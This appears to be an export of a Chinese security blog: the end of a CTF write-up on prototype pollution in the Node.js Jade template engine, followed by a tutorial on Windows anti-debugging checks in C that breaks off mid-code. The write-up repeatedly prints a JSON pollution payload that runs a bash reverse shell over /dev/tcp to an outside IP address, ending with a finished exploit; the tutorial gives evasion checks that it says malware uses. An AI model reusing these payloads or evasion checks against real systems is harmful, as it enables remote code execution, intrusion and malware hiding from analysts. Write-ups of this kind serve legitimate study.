src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2013.00.12.png"></p><p>这里先走104行的<code>parse</code>函数，再走114行的<code>compile</code>函数，得到的js拼接进body然后返回</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2013.01.23.png"></p><p>104行的<code>parse</code>函数操作空间不大，跟进114行的<code>compile</code>函数</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2013.03.35.png"></p><p>继续跟进66行的<code>this.visit</code>函数</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2013.06.16.png"></p><p>发现有可控的地方，只要能进入198行的语句，就可以把<code>node.line</code>push进buf。</p><p>对这个<code>this.debug</code>进行溯源跟踪，查看是否可控，确保其一定能进入<code>if</code>判断</p><p>在由<code>this.engine</code>进入的函数里出现相关字段</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2014.58.17.png"></p><p>且是<code>undefined</code>，也就是可以污染，继续往下跟进,看哪里赋值给<code>this</code></p><p>最终发现是在<code>index.js/parse()</code>函数里的111行，创建了一个<code>compile</code>对象时给的值</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2015.04.45.png"></p><p>跟进去查看</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2015.04.08.png"></p><p>正好，还是<code>undefined</code>，而且赋值也简单，因此可以构造exp确保<code>this.debug</code>为true</p><p>这里顺带把<code>line</code>也一起污染了，这样可以保证后期的payload一定能执行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;compileDebug&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.106.95.62/3389 0&gt;&amp;1\&quot;&#x27;)&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>随便找一个对象，查看它的原型，看看是否污染成功</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2015.10.27.png"></p><p>可以发现，<code>object</code>以及带上被污染的属性了，继续往下走</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%25E9%258E%25B4%25EE%2581%2584%25E7%259D%25862023-10-24%252015.12.11.png"></p><p><code>node.line</code>也如预期一样被污染，继续执行</p><p>报错</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2014.50.51.png"></p><p>依据报错信息，进入<code>compiler.js</code>的225行查看</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2015.20.02.png"></p><p>调试发现，当<code>node</code>为刚刚污染的语句时，<code>node.type</code>为<code>undefined</code>，进而引发报错</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2015.23.06.png"></p><p>考虑继续污染<code>node.type</code>，那就直接污染成<code>Block</code>吧，跟上一个节点一样</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;Block&quot;</span>,<span class="hljs-string">&quot;compileDebug&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.106.95.62/3389 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>继续报错</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2015.49.36.png"></p><p>跟入<code>compiler.js</code>的283行查看</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2015.51.23.png"></p><p>就是283行那几句出问题，那就继续污染这几个变量</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;nodes&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;length&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;escape&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;pp&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;Block&quot;</span>,<span class="hljs-string">&quot;compileDebug&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.106.95.62/3389 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>继续报错</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2015.58.36.png"></p><p>前4点依旧处于<code>jade</code>模块，在<code>jade</code>模块中，最终报错点在<code>index.js</code>的149行</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2015.58.42.png"></p><p>尝试污染<code>options.self</code>为true，进而避免进入149行，看能不能解决此问题</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;nodes&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;length&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;escape&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;pp&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;Block&quot;</span>,<span class="hljs-string">&quot;compileDebug&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.106.95.62/3389 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>Bingo!，成功弹shell</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2016.02.25.png"></p><h2 id="2-exp"><a href="#2-exp" class="headerlink" title="2.exp"></a>2.exp</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;nodes&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;length&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;escape&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;pp&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;Block&quot;</span>,<span class="hljs-string">&quot;compileDebug&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.106.95.62/3389 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>也有更稍微简短的exp（也就是换了一个Block节点）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;Code&quot;</span>，<span class="hljs-string">&quot;compileDebug&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.106.95.62/3389 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>NOTE：如果POST的数据没有接收到，看看HTTP头有没有<code>Content-Type: application/json</code>，没有的话加一个（本地做的时候，没有这个字段）</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
      <category>prototype</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>prototype</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反调试技术初探</title>
    <link href="/2023/10/21/anti_base/"/>
    <url>/2023/10/21/anti_base/</url>
    
    <content type="html"><![CDATA[<p>记录一些常用基础反调试技术</p><span id="more"></span><h2 id="一、-API级别"><a href="#一、-API级别" class="headerlink" title="一、 API级别"></a>一、 API级别</h2><h3 id="1-IsDebuggerPresent"><a href="#1-IsDebuggerPresent" class="headerlink" title="1.IsDebuggerPresent"></a>1.IsDebuggerPresent</h3><p>IsDebuggerPresent查询进程环境块PEB中的<code>IsDebugged</code>标志，如果没有运行在调试环境中，返回0，否则返回一个非零值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">CheckDebug</span><span class="hljs-params">()</span>  &#123;  <br>    <span class="hljs-keyword">return</span> IsDebuggerPresent();  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-ChechRemoteDebuggerPresent"><a href="#2-ChechRemoteDebuggerPresent" class="headerlink" title="2.ChechRemoteDebuggerPresent"></a>2.ChechRemoteDebuggerPresent</h3><p>与<code>IsDebuggerPresent</code>使用几乎一致，可以探测系统其他进程是否被调试，通过传递自身进程句柄还可以探测自身是否被调试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">CheckDebug</span><span class="hljs-params">()</span>  &#123;  <br>    BOOL ret;  <br>    CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;ret);  <br>    <span class="hljs-keyword">return</span> ret;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-NtQueryInformationProcess"><a href="#3-NtQueryInformationProcess" class="headerlink" title="3. NtQueryInformationProcess"></a>3. NtQueryInformationProcess</h3><p>函数原型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">__kernel_entry NTSTATUS <span class="hljs-title function_">NtQueryInformationProcess</span><span class="hljs-params">(</span><br><span class="hljs-params">  [in]            HANDLE           ProcessHandle,</span><br><span class="hljs-params">  [in]            PROCESSINFOCLASS ProcessInformationClass,</span><br><span class="hljs-params">  [out]           PVOID            ProcessInformation,</span><br><span class="hljs-params">  [in]            ULONG            ProcessInformationLength,</span><br><span class="hljs-params">  [out, optional] PULONG           ReturnLength</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>参数</p><blockquote><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[in]</span> ProcessHandle<br></code></pre></td></tr></table></figure><p>要为其检索信息的进程句柄。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">[in] ProcessInformationClass<br></code></pre></td></tr></table></figure><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td><strong>ProcessBasicInformation</strong><br />0</td><td>检索指向 PEB 结构的指针，该结构可用于确定是否正在调试指定的进程，以及系统用于标识指定进程的唯一值。使用 <a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/debugapi/nf-debugapi-checkremotedebuggerpresent">CheckRemoteDebuggerPresent</a> 和 <a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/processthreadsapi/nf-processthreadsapi-getprocessid">GetProcessId</a> 函数获取此信息。</td></tr><tr><td><strong>ProcessDebugPort</strong><br />7</td><td>检索一个 <strong>DWORD_PTR</strong> 值，该值是进程的调试器的端口号。 非零值指示进程正在环 3 调试器的控制下运行。</td></tr><tr><td><strong>ProcessDebugFlag</strong><br />0x1f</td><td>检测是否在调试器环境下运行，零值表示正在被调试</td></tr></tbody></table><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">[<span class="hljs-keyword">out</span>] ProcessInformation<br></code></pre></td></tr></table></figure><p>指向调用应用程序提供的缓冲区的指针，函数将请求的信息写入其中。 写入的信息的大小因 <em>ProcessInformationClass</em> 参数的数据类型而异</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[in]</span> ProcessInformationLength<br></code></pre></td></tr></table></figure><p><em>ProcessInformation</em> 参数指向的缓冲区的大小（以字节为单位）。</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">[<span class="hljs-keyword">out</span>, <span class="hljs-keyword">optional</span>] ReturnLength<br></code></pre></td></tr></table></figure><p>指向变量的指针，其中函数返回所请求信息的大小。 如果函数成功，则这是 <em>由 ProcessInformation</em> 参数指向的缓冲区中写入的信息的大小 (如果缓冲区太小，则为成功接收信息) 所需的最小缓冲区大小。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">CheckDebug</span><span class="hljs-params">()</span> &#123;<br><br><span class="hljs-type">int</span> debugFlag = <span class="hljs-number">0</span>;<br>HMODULE hModule = LoadLibrary(TEXT(<span class="hljs-string">&quot;Ntdll.dll&quot;</span>));<br>NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, <span class="hljs-string">&quot;NtQueryInformationProcess&quot;</span>);<br>NtQueryInformationProcess(GetCurrentProcess(), (PROCESSINFOCLASS)<span class="hljs-number">0x1f</span>, &amp;debugFlag, <span class="hljs-keyword">sizeof</span>(debugFlag), <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">cout</span> &lt;&lt; debugFlag &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span> debugFlag == <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span>  <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-keyword">if</span> (CheckDebug()) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;HACK\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;HELLO WORLD\n&quot;</span>);<br>&#125;<br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-GetLastError"><a href="#4-GetLastError" class="headerlink" title="4.GetLastError"></a>4.GetLastError</h3><p>在程序出现错误时，MSDN会指出使用<code>GetLastError()</code>函数来获得错误原因。而调试器捕获异常后，并不会立即讲处理权交给进程处理，而是自己先接管。多数调试器默认的设置是捕获异常后不将异常传递给应用程序。如果调试器不能将异常结果正确返回到被调试进程，那么这种异常失效可以被进程内部的异常处理机制探测，据此就可以利用异常来实现反调试技术。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br>BOOL <span class="hljs-title function_">CheckDebug</span><span class="hljs-params">()</span><br>&#123;<br>DWORD ret = CloseHandle((HANDLE)<span class="hljs-number">0x1234</span>);<br><span class="hljs-keyword">if</span> (ret != <span class="hljs-number">0</span> || GetLastError() != ERROR_INVALID_HANDLE)<br>&#123;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>&#125;<br><br><span class="hljs-type">int</span>  <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><br><span class="hljs-keyword">if</span> (CheckDebug())<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;True&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;没有调试&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br><br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="二、手动检测数据结构"><a href="#二、手动检测数据结构" class="headerlink" title="二、手动检测数据结构"></a>二、手动检测数据结构</h2><p>除了使用API检测，也可以是手动检测，也就是自己去检查线程环境块等相关信息</p><h3 id="1-检测BeingDebugged属性"><a href="#1-检测BeingDebugged属性" class="headerlink" title="1.检测BeingDebugged属性"></a>1.检测BeingDebugged属性</h3><p>Windows操作系统维护着每个正在运行的进程的PEB结构，它包含与这个进程相关的所有用户态参数。这些参数包括进程环境数据，环境数据包括环境变量、加载的模块列表、内存地址，以及调试器状态</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PEB</span> &#123;</span><br>  BYTE                          Reserved1[<span class="hljs-number">2</span>];<br>  BYTE                          BeingDebugged;<br>  BYTE                          Reserved2[<span class="hljs-number">1</span>];<br>  PVOID                         Reserved3[<span class="hljs-number">2</span>];<br>  PPEB_LDR_DATA                 Ldr;<br>  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;<br>  PVOID                         Reserved4[<span class="hljs-number">3</span>];<br>  PVOID                         AtlThunkSListPtr;<br>  PVOID                         Reserved5;<br>  ULONG                         Reserved6;<br>  PVOID                         Reserved7;<br>  ULONG                         Reserved8;<br>  ULONG                         AtlThunkSListPtr32;<br>  PVOID                         Reserved9[<span class="hljs-number">45</span>];<br>  BYTE                          Reserved10[<span class="hljs-number">96</span>];<br>  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;<br>  BYTE                          Reserved11[<span class="hljs-number">128</span>];<br>  PVOID                         Reserved12[<span class="hljs-number">1</span>];<br>  ULONG                         SessionId;<br>&#125; PEB, *PPEB;<br></code></pre></td></tr></table></figure><p>运行时，<code>fs:[0x30]</code>始终指向PEB基址，为了实现反调试技术，恶意代码可以通过这个位置检查<code>BeingDebugged</code>标志，来判断是否被调试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">CheckDebug</span><span class="hljs-params">()</span>  <br>&#123;  <br>    <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;  <br>    __asm  <br>    &#123;  <br>        mov eax, fs:[<span class="hljs-number">30</span>h]  <br>        mov al, BYTE PTR [eax + <span class="hljs-number">2</span>]   <br>        mov result, al  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> result != <span class="hljs-number">0</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-检测ProcessHeap属性"><a href="#2-检测ProcessHeap属性" class="headerlink" title="2.检测ProcessHeap属性"></a>2.检测ProcessHeap属性</h3><p>Reserved数组中有一个未公开的位置叫做ProcessHeap，它被设置为加载器为进程分配的第一个堆的位置</p><p>这个ProcessHeap位于PEB结构的0x18处，第一个堆头部有一个属性字段，它告诉内核这个堆是否在调试器中创建，这些属性叫做<code>ForeceFlags</code>和<code>Flags</code>，在Windows XP系统中，<code>ForeceFlags</code>属性位于堆头部偏移<code>0x10</code>处，<code>Flags</code>位于偏移<code>0x0C</code>处，在Win7以上系统中，<code>ForeceFlags</code>位于堆头部偏移<code>0x44</code>处，<code>Flags</code>位于偏移<code>0x40</code>处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">CheckDebug</span><span class="hljs-params">()</span>  <br>&#123;  <br>    <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;  <br>  <br>        __asm  <br>        &#123;  <br>            mov eax, fs:[<span class="hljs-number">30</span>h]  <br>            mov eax, [eax + <span class="hljs-number">18</span>h]  <br>            mov eax, [eax + <span class="hljs-number">44</span>h]  <span class="hljs-comment">//检测ForeceFlags属性</span><br>            mov result, eax  <br>        &#125;    <br>    <span class="hljs-keyword">return</span> result != <span class="hljs-number">0</span>;  <br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">CheckDebug</span><span class="hljs-params">()</span>  <br>&#123;  <br>    <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;  <br>  <br>        __asm  <br>        &#123;  <br>            mov eax, fs:[<span class="hljs-number">30</span>h]  <br>            mov eax, [eax + <span class="hljs-number">18</span>h]  <br>            mov eax, [eax + <span class="hljs-number">40</span>h]  <span class="hljs-comment">//检测Flags</span><br>            mov result, eax  <br>        &#125;    <br>    <span class="hljs-keyword">return</span> result != <span class="hljs-number">2</span>;<span class="hljs-comment">//与2比较  </span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-检测NTGlobalFlag属性"><a href="#3-检测NTGlobalFlag属性" class="headerlink" title="3.检测NTGlobalFlag属性"></a>3.检测NTGlobalFlag属性</h3><p>由于调试器中启动进程与正常模式下启动进程有些不同，所以它们创建内存堆的方式也不同。系统使用PEB结构偏移量0x68处的一个未公开位置，来决定如何创建堆结构。如果这个位置的值为0x70，我们就知道进程正运行在调试器中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">CheckDebug</span><span class="hljs-params">()</span>  <br>&#123;  <br>    <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;  <br>    __asm  <br>    &#123;  <br>        mov eax, fs:[<span class="hljs-number">30</span>h]  <br>        mov eax, [eax + <span class="hljs-number">68</span>h]  <br>        and eax, <span class="hljs-number">0x70</span>  <br>        mov result, eax  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> result != <span class="hljs-number">0</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p>操作系统创建堆时，值0x70是下列标志的一个组合。如果进程从调试器启动，那么进程的这些标志将被设置。<br>(FLG_HEAP_ENABLE_TAIL_CHECK|FLG_HEAP_ENABLE_FREE_CHECK|FLG_HEAP_VALIDATE_PARAMETERS)</p><h2 id="三、识别调试器行为"><a href="#三、识别调试器行为" class="headerlink" title="三、识别调试器行为"></a>三、识别调试器行为</h2><h3 id="1-软件断点检查"><a href="#1-软件断点检查" class="headerlink" title="1.软件断点检查"></a>1.软件断点检查</h3><p>调试器设置断点的基本机制是用软件中断指令INT 3临时替换运行程序中的一条指令，然后当程序运行到这条指令时，调用调试异常处理例程。</p><p>INT 3指令的机器码是0xCC，因此无论何时，使用调试器设置一个断点，它都会<strong>插入一个0xCC</strong>来修改代码。</p><p>恶意代码常用的一种反调试技术是在它的代码中查找机器码0xCC，来扫描调试器对它代码的INT 3修改。</p><p>repne scasb指令用于在一段数据缓冲区中搜索一个字节。EDI需指向缓冲区地址，AL则包含要找的字节，ECX设为缓冲区的长度。当ECX&#x3D;0或找到该字节时，比较停止。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">CheckDebug</span><span class="hljs-params">()</span>  </span><br><span class="hljs-function"></span>&#123;  <br>    PIMAGE_DOS_HEADER pDosHeader;  <br>    PIMAGE_NT_HEADERS32 pNtHeaders;  <br>    PIMAGE_SECTION_HEADER pSectionHeader;  <br>    DWORD dwBaseImage = (DWORD)<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-literal">NULL</span>);   <br>    pDosHeader = 